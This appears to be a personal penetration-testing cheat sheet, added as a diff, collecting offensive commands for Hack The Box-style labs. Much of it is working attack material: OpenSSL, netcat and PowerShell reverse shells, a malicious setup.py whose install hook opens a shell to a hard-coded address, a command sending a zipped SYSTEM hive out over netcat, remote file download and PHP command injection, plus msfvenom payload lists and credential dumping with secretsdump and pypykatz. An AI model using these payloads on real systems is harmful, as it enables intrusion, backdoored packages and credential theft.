@@ -1,0 +1,1377 @@
+vimrc
+######################################################################
+//place the following in ~/.vimrc to have folding sections in this file
+setlocal foldmethod=marker foldmarker=######################################################################,~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+:inoremap <F9> <C-O>za
+:nnoremap <F9> za
+:inoremap <F6> ######################################################################<CR><CR><CR>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<CR><C-O>3k
+:nnoremap <F6> ######################################################################<CR><CR><CR>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<CR>
+
+//etc
+set mouse-=a
+filetype plugin indent on
+set softtabstop=4
+set shiftwidth=4
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+*nix situational awareness
+######################################################################
+w
+uptime
+ifconfig || ip a
+netstat -rn || ip route
+date; date -u; date "+%s"; uname -a
+cat /etc/*release
+ps -aux
+ps -axjf
+ps -efH
+ps -Td
+ls -lart /proc/*/exe 2>/dev/null | egrep "\->"
+netstat -ant
+
+find /etc /var/spool -name "*cron*" -exec ls -al {} + | egrep -vi "rc.*d|placeholder"
+lsmod | egrep -i "ip"
+df -h
+egrep -Ri -v "^\#" /etc/*syslog*
+find /etc -name '*hosts*' 2>/dev/null -exec egrep -i "log" {} +
+cat /etc/passwd | awk -F':' '{print "[*]",$1,"\n"$6}'
+find / -name '*.*history*' 2>/dev/null -type f -exec ls -l {} +
+
+ps -aux | awk '/journal/ && !/grep/'
+ls -al /proc/<JOURNAL_PID>/fd
+
+find /var/log /etc /run/log -mmin -5 -exec ls -al {} +
+find / -path /sys -prune -o -path /dev -prune -o -path /usr/share -prune -o -path /proc -prune -o -mmin -5 -type f -exec ls -l {} +
+
+egrep 'rwx' /proc/*{0..9}/maps
+egrep 'rwx' /proc/*{0..9}/maps | awk -F / '{print $3}' | xargs -I {} ps -q {} -o pid=,comm=,fname=
+
+ls -lart /proc/*{0..9}/exe 2>/dev/null | egrep "deleted"
+
+sestatus || getenforce
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+projects
+######################################################################
+windows shellbag viewer
+windows event log viewer
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+openssl
+######################################################################
+//callback for encrypted shell
+//local:
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>
+
+//remote:
+mkfifo /tmp/s; nohup /bin/sh -i < /tmp/s 2>&1 | nohup openssl s_client -quiet -verify 0 -connect <LOCALIP>:<PORT> > /tmp/s &
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+find
+######################################################################
+//suid files:
+find / -type f -perm -4000 -exec ls -la {} 2>/dev/null \;
+
+//sgid files:
+find / -type f -perm -2000 -exec ls -la {} 2>/dev/null \;
+
+//files changed in last X minutes
+find / -path /sys -prune -o -path /dev -prune -o -path /usr/share -prune -o -path /proc -prune -o -mmin -<X> -type f -exec ls -l {} +
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+nmap
+######################################################################
+//basic synscan:
+nmap -sS -sV -sC -oA out.nmap <IP>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+gobuster
+######################################################################
+//basic extension search:
+gobuster dir -u <URL> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt -o <FILENAME>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+netcat // nc 
+######################################################################
+//file transfer
+//receiver:
+nc -lvnp <PORT> > <OUTFILE>
+//sender:
+nc <IP> <PORT> < <INFILE>
+
+//reverse shell on windows
+.\nc.exe <IP> <PORT> -e cmd.exe/powershell.exe
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+imap
+######################################################################
+//login:
+BLAHa001 login <USER> <PASSWORD>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+pypi
+######################################################################
+//upload to pypi server:
+create the following files:
+mkdir package; cd package
+LICENSE.txt
+README
+//setup.cfg
+	[metadata]
+	description-file = README.md
+
+//setup.py
+from distutils.core import setup
+from setuptools import find_packages
+from setuptools.command.install import install
+import socket,os,subprocess
+
+class PostInstallCommand(install):
+        def run(self):
+                try:
+                        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                        s.connect(("10.10.16.16",4435))
+                        os.dup2(s.fileno(),0)
+                        os.dup2(s.fileno(),1)
+                        os.dup2(s.fileno(),2)
+                        p=subprocess.call(["/bin/sh","-i"])
+                        install.run(self)
+                except:
+                        install.run(self)
+
+setup(
+        name='mypkg',
+        version="0.1",
+        packages=find_packages(),
+        cmdclass={
+                'install':PostInstallCommand,
+        },
+)
+
+~/.pypirc
+	[distutils]
+	index-servers = 
+        	local
+
+	[local]
+	repository: <URL>
+	username: <USER>
+	password: <PASS>
+now you can run:
+python setup.py sdist upload -r local
+or
+python setup.py sdist bdist_wheel
+python3 -m twine upload --repository local dist/*
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+msfvenom // reverse shells
+######################################################################
+//list payloads
+msfvenom -l payloads
+
+//reverse python
+msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
+
+//reverse meterpreter
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > mtrprtr.binG
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+msfvenom windows payloads
+######################################################################
+//msfvenom -l payloads
+cmd/windows/adduser
+cmd/windows/bind_lua
+cmd/windows/bind_perl
+cmd/windows/bind_perl_ipv6
+cmd/windows/bind_ruby
+cmd/windows/download_eval_vbs
+cmd/windows/download_exec_vbs
+cmd/windows/generic
+cmd/windows/powershell_bind_tcp
+cmd/windows/powershell_reverse_tcp
+cmd/windows/reverse_lua
+cmd/windows/reverse_perl
+cmd/windows/reverse_powershell
+cmd/windows/reverse_ruby
+windows/adduser
+windows/dllinject/bind_hidden_ipknock_tcp
+windows/dllinject/bind_hidden_tcp
+windows/dllinject/bind_ipv6_tcp
+windows/dllinject/bind_ipv6_tcp_uuid
+windows/dllinject/bind_named_pipe
+windows/dllinject/bind_nonx_tcp
+windows/dllinject/bind_tcp
+windows/dllinject/bind_tcp_rc4
+windows/dllinject/bind_tcp_uuid
+windows/dllinject/find_tag
+windows/dllinject/reverse_hop_http
+windows/dllinject/reverse_http
+windows/dllinject/reverse_http_proxy_pstore
+windows/dllinject/reverse_ipv6_tcp
+windows/dllinject/reverse_nonx_tcp
+windows/dllinject/reverse_ord_tcp
+windows/dllinject/reverse_tcp
+windows/dllinject/reverse_tcp_allports
+windows/dllinject/reverse_tcp_dns
+windows/dllinject/reverse_tcp_rc4
+windows/dllinject/reverse_tcp_rc4_dns
+windows/dllinject/reverse_tcp_uuid
+windows/dllinject/reverse_winhttp
+windows/dns_txt_query_exec
+windows/download_exec
+windows/exec
+windows/format_all_drives
+windows/loadlibrary
+windows/messagebox
+windows/meterpreter/bind_hidden_ipknock_tcp
+windows/meterpreter/bind_hidden_tcp
+windows/meterpreter/bind_ipv6_tcp
+windows/meterpreter/bind_ipv6_tcp_uuid
+windows/meterpreter/bind_named_pipe
+windows/meterpreter/bind_nonx_tcp
+windows/meterpreter/bind_tcp
+windows/meterpreter/bind_tcp_rc4
+windows/meterpreter/bind_tcp_uuid
+windows/meterpreter/find_tag
+windows/meterpreter/reverse_hop_http
+windows/meterpreter/reverse_http
+windows/meterpreter/reverse_http_proxy_pstore
+windows/meterpreter/reverse_https
+windows/meterpreter/reverse_https_proxy
+windows/meterpreter/reverse_ipv6_tcp
+windows/meterpreter/reverse_named_pipe
+windows/meterpreter/reverse_nonx_tcp
+windows/meterpreter/reverse_ord_tcp
+windows/meterpreter/reverse_tcp
+windows/meterpreter/reverse_tcp_allports
+windows/meterpreter/reverse_tcp_dns
+windows/meterpreter/reverse_tcp_rc4
+windows/meterpreter/reverse_tcp_rc4_dns
+windows/meterpreter/reverse_tcp_uuid
+windows/meterpreter/reverse_winhttp
+windows/meterpreter/reverse_winhttps
+windows/meterpreter_bind_named_pipe
+windows/meterpreter_bind_tcp
+windows/meterpreter_reverse_http
+windows/meterpreter_reverse_https
+windows/meterpreter_reverse_ipv6_tcp
+windows/meterpreter_reverse_tcp
+windows/metsvc_bind_tcp
+windows/metsvc_reverse_tcp
+windows/patchupdllinject/bind_hidden_ipknock_tcp
+windows/patchupdllinject/bind_hidden_tcp
+windows/patchupdllinject/bind_ipv6_tcp
+windows/patchupdllinject/bind_ipv6_tcp_uuid
+windows/patchupdllinject/bind_named_pipe
+windows/patchupdllinject/bind_nonx_tcp
+windows/patchupdllinject/bind_tcp
+windows/patchupdllinject/bind_tcp_rc4
+windows/patchupdllinject/bind_tcp_uuid
+windows/patchupdllinject/find_tag
+windows/patchupdllinject/reverse_ipv6_tcp
+windows/patchupdllinject/reverse_nonx_tcp
+windows/patchupdllinject/reverse_ord_tcp
+windows/patchupdllinject/reverse_tcp
+windows/patchupdllinject/reverse_tcp_allports
+windows/patchupdllinject/reverse_tcp_dns
+windows/patchupdllinject/reverse_tcp_rc4
+windows/patchupdllinject/reverse_tcp_rc4_dns
+windows/patchupdllinject/reverse_tcp_uuid
+windows/patchupmeterpreter/bind_hidden_ipknock_tcp
+windows/patchupmeterpreter/bind_hidden_tcp
+windows/patchupmeterpreter/bind_ipv6_tcp
+windows/patchupmeterpreter/bind_ipv6_tcp_uuid
+windows/patchupmeterpreter/bind_named_pipe
+windows/patchupmeterpreter/bind_nonx_tcp
+windows/patchupmeterpreter/bind_tcp
+windows/patchupmeterpreter/bind_tcp_rc4
+windows/patchupmeterpreter/bind_tcp_uuid
+windows/patchupmeterpreter/find_tag
+windows/patchupmeterpreter/reverse_ipv6_tcp
+windows/patchupmeterpreter/reverse_nonx_tcp
+windows/patchupmeterpreter/reverse_ord_tcp
+windows/patchupmeterpreter/reverse_tcp
+windows/patchupmeterpreter/reverse_tcp_allports
+windows/patchupmeterpreter/reverse_tcp_dns
+windows/patchupmeterpreter/reverse_tcp_rc4
+windows/patchupmeterpreter/reverse_tcp_rc4_dns
+windows/patchupmeterpreter/reverse_tcp_uuid
+windows/pingback_bind_tcp
+windows/pingback_reverse_tcp
+windows/powershell_bind_tcp
+windows/powershell_reverse_tcp
+windows/shell/bind_hidden_ipknock_tcp
+windows/shell/bind_hidden_tcp
+windows/shell/bind_ipv6_tcp
+windows/shell/bind_ipv6_tcp_uuid
+windows/shell/bind_named_pipe
+windows/shell/bind_nonx_tcp
+windows/shell/bind_tcp
+windows/shell/bind_tcp_rc4
+windows/shell/bind_tcp_uuid
+windows/shell/find_tag
+windows/shell/reverse_ipv6_tcp
+windows/shell/reverse_nonx_tcp
+windows/shell/reverse_ord_tcp
+windows/shell/reverse_tcp
+windows/shell/reverse_tcp_allports
+windows/shell/reverse_tcp_dns
+windows/shell/reverse_tcp_rc4
+windows/shell/reverse_tcp_rc4_dns
+windows/shell/reverse_tcp_uuid
+windows/shell/reverse_udp
+windows/shell_bind_tcp
+windows/shell_bind_tcp_xpfw
+windows/shell_hidden_bind_tcp
+windows/shell_reverse_tcp
+windows/speak_pwned
+windows/upexec/bind_hidden_ipknock_tcp
+windows/upexec/bind_hidden_tcp
+windows/upexec/bind_ipv6_tcp
+windows/upexec/bind_ipv6_tcp_uuid
+windows/upexec/bind_named_pipe
+windows/upexec/bind_nonx_tcp
+windows/upexec/bind_tcp
+windows/upexec/bind_tcp_rc4
+windows/upexec/bind_tcp_uuid
+windows/upexec/find_tag
+windows/upexec/reverse_ipv6_tcp
+windows/upexec/reverse_nonx_tcp
+windows/upexec/reverse_ord_tcp
+windows/upexec/reverse_tcp
+windows/upexec/reverse_tcp_allports
+windows/upexec/reverse_tcp_dns
+windows/upexec/reverse_tcp_rc4
+windows/upexec/reverse_tcp_rc4_dns
+windows/upexec/reverse_tcp_uuid
+windows/upexec/reverse_udp
+windows/vncinject/bind_hidden_ipknock_tcp
+windows/vncinject/bind_hidden_tcp
+windows/vncinject/bind_ipv6_tcp
+windows/vncinject/bind_ipv6_tcp_uuid
+windows/vncinject/bind_named_pipe
+windows/vncinject/bind_nonx_tcp
+windows/vncinject/bind_tcp
+windows/vncinject/bind_tcp_rc4
+windows/vncinject/bind_tcp_uuid
+windows/vncinject/find_tag
+windows/vncinject/reverse_hop_http
+windows/vncinject/reverse_http
+windows/vncinject/reverse_http_proxy_pstore
+windows/vncinject/reverse_ipv6_tcp
+windows/vncinject/reverse_nonx_tcp
+windows/vncinject/reverse_ord_tcp
+windows/vncinject/reverse_tcp
+windows/vncinject/reverse_tcp_allports
+windows/vncinject/reverse_tcp_dns
+windows/vncinject/reverse_tcp_rc4
+windows/vncinject/reverse_tcp_rc4_dns
+windows/vncinject/reverse_tcp_uuid
+windows/vncinject/reverse_winhttp
+windows/x64/exec
+windows/x64/loadlibrary
+windows/x64/messagebox
+windows/x64/meterpreter/bind_ipv6_tcp
+windows/x64/meterpreter/bind_ipv6_tcp_uuid
+windows/x64/meterpreter/bind_named_pipe
+windows/x64/meterpreter/bind_tcp
+windows/x64/meterpreter/bind_tcp_rc4
+windows/x64/meterpreter/bind_tcp_uuid
+windows/x64/meterpreter/reverse_http
+windows/x64/meterpreter/reverse_https
+windows/x64/meterpreter/reverse_named_pipe
+windows/x64/meterpreter/reverse_tcp
+windows/x64/meterpreter/reverse_tcp_rc4
+windows/x64/meterpreter/reverse_tcp_uuid
+windows/x64/meterpreter/reverse_winhttp
+windows/x64/meterpreter/reverse_winhttps
+windows/x64/meterpreter_bind_named_pipe
+windows/x64/meterpreter_bind_tcp
+windows/x64/meterpreter_reverse_http
+windows/x64/meterpreter_reverse_https
+windows/x64/meterpreter_reverse_ipv6_tcp
+windows/x64/meterpreter_reverse_tcp
+windows/x64/pingback_reverse_tcp
+windows/x64/powershell_bind_tcp
+windows/x64/powershell_reverse_tcp
+windows/x64/shell/bind_ipv6_tcp
+windows/x64/shell/bind_ipv6_tcp_uuid
+windows/x64/shell/bind_named_pipe
+windows/x64/shell/bind_tcp
+windows/x64/shell/bind_tcp_rc4
+windows/x64/shell/bind_tcp_uuid
+windows/x64/shell/reverse_tcp
+windows/x64/shell/reverse_tcp_rc4
+windows/x64/shell/reverse_tcp_uuid
+windows/x64/shell_bind_tcp
+windows/x64/shell_reverse_tcp
+windows/x64/vncinject/bind_ipv6_tcp
+windows/x64/vncinject/bind_ipv6_tcp_uuid
+windows/x64/vncinject/bind_named_pipe
+windows/x64/vncinject/bind_tcp
+windows/x64/vncinject/bind_tcp_rc4
+windows/x64/vncinject/bind_tcp_uuid
+windows/x64/vncinject/reverse_http
+windows/x64/vncinject/reverse_https
+windows/x64/vncinject/reverse_tcp
+windows/x64/vncinject/reverse_tcp_rc4
+windows/x64/vncinject/reverse_tcp_uuid
+windows/x64/vncinject/reverse_winhttp
+windows/x64/vncinject/reverse_winhttps
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+msfvenom linux payloads
+######################################################################
+linux/aarch64/meterpreter/reverse_tcp
+linux/aarch64/meterpreter_reverse_http
+linux/aarch64/meterpreter_reverse_https
+linux/aarch64/meterpreter_reverse_tcp
+linux/aarch64/shell/reverse_tcp
+linux/aarch64/shell_reverse_tcp
+linux/armbe/meterpreter_reverse_http
+linux/armbe/meterpreter_reverse_https
+linux/armbe/meterpreter_reverse_tcp
+linux/armbe/shell_bind_tcp
+linux/armle/adduser
+linux/armle/exec
+linux/armle/meterpreter/bind_tcp
+linux/armle/meterpreter/reverse_tcp
+linux/armle/meterpreter_reverse_http
+linux/armle/meterpreter_reverse_https
+linux/armle/meterpreter_reverse_tcp
+linux/armle/shell/bind_tcp
+linux/armle/shell/reverse_tcp
+linux/armle/shell_bind_tcp
+linux/armle/shell_reverse_tcp
+linux/mips64/meterpreter_reverse_http
+linux/mips64/meterpreter_reverse_https
+linux/mips64/meterpreter_reverse_tcp
+linux/mipsbe/exec
+linux/mipsbe/meterpreter/reverse_tcp
+linux/mipsbe/meterpreter_reverse_http
+linux/mipsbe/meterpreter_reverse_https
+linux/mipsbe/meterpreter_reverse_tcp
+linux/mipsbe/reboot
+linux/mipsbe/shell/reverse_tcp
+linux/mipsbe/shell_bind_tcp
+linux/mipsbe/shell_reverse_tcp
+linux/mipsle/exec
+linux/mipsle/meterpreter/reverse_tcp
+linux/mipsle/meterpreter_reverse_http
+linux/mipsle/meterpreter_reverse_https
+linux/mipsle/meterpreter_reverse_tcp
+linux/mipsle/reboot
+linux/mipsle/shell/reverse_tcp
+linux/mipsle/shell_bind_tcp
+linux/mipsle/shell_reverse_tcp
+linux/ppc/meterpreter_reverse_http
+linux/ppc/meterpreter_reverse_https
+linux/ppc/meterpreter_reverse_tcp
+linux/ppc/shell_bind_tcp
+linux/ppc/shell_find_port
+linux/ppc/shell_reverse_tcp
+linux/ppc64/shell_bind_tcp
+linux/ppc64/shell_find_port
+linux/ppc64/shell_reverse_tcp
+linux/ppc64le/meterpreter_reverse_http
+linux/ppc64le/meterpreter_reverse_https
+linux/ppc64le/meterpreter_reverse_tcp
+linux/ppce500v2/meterpreter_reverse_http
+linux/ppce500v2/meterpreter_reverse_https
+linux/ppce500v2/meterpreter_reverse_tcp
+linux/x64/exec
+linux/x64/meterpreter/bind_tcp
+linux/x64/meterpreter/reverse_tcp
+linux/x64/meterpreter_reverse_http
+linux/x64/meterpreter_reverse_https
+linux/x64/meterpreter_reverse_tcp
+linux/x64/pingback_bind_tcp
+linux/x64/pingback_reverse_tcp
+linux/x64/shell/bind_tcp
+linux/x64/shell/reverse_tcp
+linux/x64/shell_bind_ipv6_tcp
+linux/x64/shell_bind_tcp
+linux/x64/shell_bind_tcp_random_port
+linux/x64/shell_find_port
+linux/x64/shell_reverse_ipv6_tcp
+linux/x64/shell_reverse_tcp
+linux/x86/adduser
+linux/x86/chmod
+linux/x86/exec
+linux/x86/meterpreter/bind_ipv6_tcp
+linux/x86/meterpreter/bind_ipv6_tcp_uuid
+linux/x86/meterpreter/bind_nonx_tcp
+linux/x86/meterpreter/bind_tcp
+linux/x86/meterpreter/bind_tcp_uuid
+linux/x86/meterpreter/find_tag
+linux/x86/meterpreter/reverse_ipv6_tcp
+linux/x86/meterpreter/reverse_nonx_tcp
+linux/x86/meterpreter/reverse_tcp
+linux/x86/meterpreter/reverse_tcp_uuid
+linux/x86/meterpreter_reverse_http
+linux/x86/meterpreter_reverse_https
+linux/x86/meterpreter_reverse_tcp
+linux/x86/metsvc_bind_tcp
+linux/x86/metsvc_reverse_tcp
+linux/x86/read_file
+linux/x86/shell/bind_ipv6_tcp
+linux/x86/shell/bind_ipv6_tcp_uuid
+linux/x86/shell/bind_nonx_tcp
+linux/x86/shell/bind_tcp
+linux/x86/shell/bind_tcp_uuid
+linux/x86/shell/find_tag
+linux/x86/shell/reverse_ipv6_tcp
+linux/x86/shell/reverse_nonx_tcp
+linux/x86/shell/reverse_tcp
+linux/x86/shell/reverse_tcp_uuid
+linux/x86/shell_bind_ipv6_tcp
+linux/x86/shell_bind_tcp
+linux/x86/shell_bind_tcp_random_port
+linux/x86/shell_find_port
+linux/x86/shell_find_tag
+linux/x86/shell_reverse_tcp
+linux/x86/shell_reverse_tcp_ipv6
+linux/zarch/meterpreter_reverse_http
+linux/zarch/meterpreter_reverse_https
+linux/zarch/meterpreter_reverse_tcp
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+hashcat
+######################################################################
+//crack .htpasswd hash
+//ex: $apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
+//place password above in its own file
+hashcat -a 0 -m 1600 <FILE> /usr/share/wordlists/rockyou.txt
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+wfuzz
+######################################################################
+//bruteforce subdomains
+wfuzz -w <WORDLIST> -H "Host: FUZZ.<HOST.COM>" --hh 0 -t 100 <IP>
+
+//bruteforce domains
+wfuzz -w <WORDLIST> -H "Host: FUZZ.htb" --hh 0 -t 100 <IP>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+binary analysis
+######################################################################
+//view symbols in program
+readelf --syms <FILE>
+
+//strip binary
+strip --strip-all <FILE>
+
+//dump a specific section's information
+objdump -sj .rodata <FILE>
+
+//disassemble all code in file
+objdump -M intel -d <FILE>
+
+//view all relocation symbols
+readelf --relocs <FILE>
+
+//view string dump of section
+readelf -p .interp <FILE>
+
+//view program header table, segments
+readelf --wide --segments <FILE>
+
+//view section headers
+readelf -S --wide <FILE>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+powershell
+######################################################################
+//reverse shell - full service, may not work
+powershell.exe "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" 
+
+//reverse shell - stripped down - may be blocked by AV
+powershell.exe "$sm=(New-Object Net.Sockets.TCPClient('<IP>',<PORT>)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"
+
+//download file - url encoded 
+Powershell.exe+(New-Object+Net.WebClient).DownloadFile('http%3a//<IP>:<PORT>/<FILE>','<FILENAME_ON_TARGET')
+
+//download file
+powershell.exe (New-Object Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>','<FILENAME_ON_TARGET'>)
+
+//zip file
+Compress-Archive -LiteralPath <PATH_TO_FILE> -DestinationPath <PATH_TO_FILE>.zip -Force
+
+//run cmd.exe in background
+start-job {cmd /c "nc.exe 10.10.16.16 443 < SYSTEM.zip"}
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+wmic
+######################################################################
+//list processes
+wmic process get processid,commandline,executablepath /format:list
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+curl
+######################################################################
+//inject commands to PHP parameter
+curl <URL>?<PARAM>=<COMMAND>
+
+//download file
+curl -v --get --data-urlencode "<PARAM>=Powershell.exe (New-Object Net.WebClient).DownloadFile('http://<IP>:<PORT>/blah.exe','blah.exe')" <URL>
+
+//user agent string, chrome
+curl -O -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" -L <URL>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+evil-winrm
+######################################################################
+gem install evil-winrm
+//connect using NTLM hash
+evil-winrm -i <IP> -u <USERNAME> -H <NTHASH>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+plink
+######################################################################
+//plink access service on target running on localhost
+//need to run command on windows target, connect back to me
+plink.exe <MY_IP> -R <LPORT>:127.0.0.1:<RPORT>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+smbclient
+######################################################################
+//attempt connection using null session
+smbclient -L //<IP> -N
+
+//list files on share
+smbclient -U "" -n //<HOST>/<SHARE> -c 'recurse on;ls'
+smbclient //DC01.htb/profiles$ -N
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+pth-smbclient
+######################################################################
+//smbclient with hashes
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+getnpusers.py
+######################################################################
+//kerberoasting - see if any users have PREAUTH disabled, if so should get hash
+GetNPUsers.py -request -output kerbroast.txt -format john -usersfile <FILE> -no-pass <-k> -dc-ip <TARGET> <DOMAIN>
+	Guest
+	User
+	Administrator
+//attempt with domain user credentials
+GetNPUsers.py -request -output kerbroast.txt -format john -usersfile <FILE> <-k> -dc-ip <TARGET> <DOMAIN>/<USER>:<PASSWORD>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+secretsdump.py
+######################################################################
+//dump ntds.dit hashes
+secretsdump.py -ntds ./ntds.dit -system ./SYSTEM -sam ./SAM LOCAL -outputfile ntlm-extract
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+silversearcher-ag
+######################################################################
+//faster grep
+ag "struct tcphdr"
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+resources
+######################################################################
+GTFObins
+LOLBAS
+Walk the dog// AD Cheat Sheet s1ckBoy1337 - has info on impacket getnpusers
+WINPEAS
+bwm-ng
+python pwntools
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+alsa
+######################################################################
+//turn on microphone
+amixer set Capture cap
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+htb hardening
+######################################################################
+//monitor connections from htb net
+sudo tcpdump -i tun0 -XXX 'not host <TARGET> and not host <DEF_GW> and net 10.10.0.0/16'
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+banner grabbing
+######################################################################
+echo -ne "OPTIONS * HTTP/1.0" | nc -v <IP> <PORT>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+ldapsearch
+######################################################################
+//get default naming context - i.e. DC=BLACKFIELD,DC=local
+ldapsearch -x -b "" -s base -H ldap://<IP>/ defaultNamingContext
+
+//get information on specific user
+ldapsearch -x -H ldap://<IP> -D "<USERNAME>@<DOMAIN>.<LOCAL>" -W -b "cn=<USERNAME>,cn=users,<DEFAULT_NAMING_CONTEXT>"
+
+//nmap ldap-search
+nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=<USERNAME>,cn=users,<DEFAULT_NAMING_CONTEXT>",ldap.password=<PASSWORD>,ldap.qfilter=users,ldap.maxobjects=-1' -Pn <HOST>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+rpcclient
+######################################################################
+//log in with domain user credentials
+rpclient -U "<DOMAIN>/<USERNAME>" <IP>
+
+//list privileges
+enumprivs
+
+//get user information
+queryuser <USERNAME>
+
+//find groups of which user is member - rid is from queryuser
+queryusergroups <RID>
+
+//find name of user's groups - rid comes from queryusergroups
+querygroup <RID>
+
+//change user password (requires SeEnableDelegationPrivilege)
+setuserinfo2 <USERNAME> 23 '<PASSWORD>'
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+pypykatz
+######################################################################
+pip3 install pypykatz
+//parse lsass.DMP file  -- mimikatz for linux
+pypykatz lsa minidump <LSASS.DMP>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+winpeas
